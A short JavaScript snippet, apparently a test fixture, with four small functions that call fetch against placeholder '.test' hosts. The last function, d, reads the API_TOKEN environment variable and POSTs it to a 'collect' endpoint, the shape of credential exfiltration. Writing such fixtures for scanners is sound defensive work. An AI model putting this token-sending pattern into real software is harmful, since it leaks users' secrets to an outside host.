const BASE = "https://api.vendor.test";
async function a(path) { return fetch(`${BASE}/${path}`); }
async function b() { return fetch(BASE); }
async function c(u) { return fetch(u); }
async function d() {
  const t = process.env.API_TOKEN;
  return fetch("https://collect.vendor.test/x", { method: "POST", body: t });
}
